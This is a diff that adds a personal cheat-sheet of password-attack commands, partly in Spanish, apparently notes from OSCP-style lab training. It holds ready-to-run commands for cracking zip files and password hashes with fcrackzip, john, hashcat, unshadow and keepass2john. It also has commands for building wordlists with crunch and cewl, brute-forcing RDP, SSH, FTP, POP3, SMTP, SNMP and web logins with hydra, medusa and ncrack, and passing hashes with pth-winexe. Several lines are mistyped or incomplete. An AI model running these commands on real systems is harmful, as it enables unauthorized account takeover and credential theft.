@@ -1,0 +1,86 @@
+archivos
+fcrackzip -v -D -p /usr/share/wordlists/rockyou.txt -u 16162020_backup.zip 2>/dev/null
+
+https://github.com/Dormidera/WordList-Compendium/blob/master/Injections/SQL
+
+https://hashkiller.co.uk/Tools/HashcatGUI
+---------
+crunch 6 6 0123456789ABCDEF -o crunch1.txt 
+wc -l crunch1.txt
+crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha
+cat dumped.pass.txt 
+crunch 8 8 -t ,@@^^%%%
+@ lower case
+, upper case
+% numeri
+^ special character
+--------------------------------------------------------
+cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt 
+wc -l megacorp-cewl.txt
+grep nanobot megacorp-cewl.txt
+nano /etc/john/john.conf 
+john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
+john --wordlist=megacorp-cewl.txt --rules --stdout >hugepass.txt 
+-----------------------------------------------------------
+RDP Brute force
+medusa -h 10.11.1.219 -u admin -P password-file.txt -M http -m
+DIR:/admin -T 10 
+--------------------
+admin login
+meduca -h -u -P post -H http -n 81 -m DIR:/admin -T 30
+------------------
+RDP Brute force
+ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.35 
+-------------------
+SNMP 
+hydra -P password-file.txt -v 10.11.1.219 snmp
+ 
+hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 
+192.168.X.XXX ftp -V
+
+hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 
+192.168.X.XXX pop3 -V
+
+hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V
+https://null-byte.wonderhowto.com/forum/problem-with-bruteforce-using-hydra-0175685/
+
+--------------------
+SSH bruteforce
+hydra -l root -P password-file.txt 10.11.1.219 ssh 
+---------------------
+hash-identifier
+john 127.0.0.1.pwdump 
+john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt 
+unshadow passwd-file.txt shadow-file.txt 
+unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt 
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes
+john --format=descrypt --wordlist 
+/usr/share/wordlists/rockyou.txt hash.txt
+john --format=descrypt hash --show
+sh2john
+keepass2john
+--format=KeePass
+keepass2hohn
+---------------
+https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/--------------
+./olcHascat-plus64.bin -m 110 hahes.txt ../bin-wordlist.txt --force
+
+-----------------------
+-----------------------------
+pth-winexe -U administrator% //10.11.01.76 cmd 
+-------------------------------
+gpp-decrypt 
+-----------------------------------
+httptunnel te deja crear una conexion ssh por el puerto que quieras
+
+https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/
+hydra ^^usr ^^pass
+hydra -l none
+
+-------------------------------
+wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z file,extensions http://192.168.1.X/design/FUZZ.FUZ2Z
+
+
+
